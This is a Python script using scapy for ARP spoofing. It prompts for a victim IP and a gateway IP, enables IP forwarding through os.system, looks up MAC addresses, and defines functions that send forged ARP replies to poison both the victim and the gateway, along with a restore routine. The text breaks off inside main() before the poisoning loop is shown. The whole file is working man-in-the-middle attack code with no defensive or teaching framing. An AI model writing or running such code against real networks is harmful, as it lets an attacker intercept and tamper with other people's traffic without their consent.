from scapy.all import *
import os
import sys
import time

from scapy.layers.l2 import Ether, ARP, srp


def get_information():
    try:  # get information from the user
        victim_ip = input("Enter the IP address of the target: ")
        interface = input("Enter the interface: ")
        gateway_ip = input("Enter the gateway IP address: ")
    except KeyboardInterrupt:
        print("\n[-] User requested shutdown")
        print("[-] Exiting...")
        sys.exit(1)
    return victim_ip, interface, gateway_ip


VICTIM_IP, INTERFACE, GATEWAY_IP = get_information()


def get_mac(ip):  # return the MAC address of the target
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=INTERFACE, timeout=2, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


# send ARP responses to the target and the gateway
def arp_poison(gateway_mac, victim_mac):
    send(ARP(op=2, pdst=VICTIM_IP, psrc=GATEWAY_IP, hwdst=victim_mac), iface=INTERFACE)
    send(ARP(op=2, pdst=GATEWAY_IP, psrc=VICTIM_IP, hwdst=gateway_mac), iface=INTERFACE)


def reArp(gateway_mac, victim_mac):  # restore the network to its normal state
    print("\n[*] Restoring targets...")
    send(ARP(op=2, pdst=GATEWAY_IP, psrc=VICTIM_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5)
    send(ARP(op=2, pdst=VICTIM_IP, psrc=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    print("[*] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # disable IP forwarding
    print("[*] Shutting down...")
    sys.exit(1)


def main():

    # enable IP forwarding
    print("\n[*] Enabling IP forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # get MAC addresses of victim machine and access point
    try:
        victim_mac = get_mac(VICTIM_IP)
    except Exception:
        print("disabling IP forwarding")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # disable IP forwarding
        print("couldn't find victim MAC address")
        sys.exit(1)
    try:
        gateway_mac = get_mac(GATEWAY_IP)
    except Exception:
        print("disabling IP forwarding")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # disable IP forwarding
        print("couldn't find gateway MAC address")
        sys.exit(1)
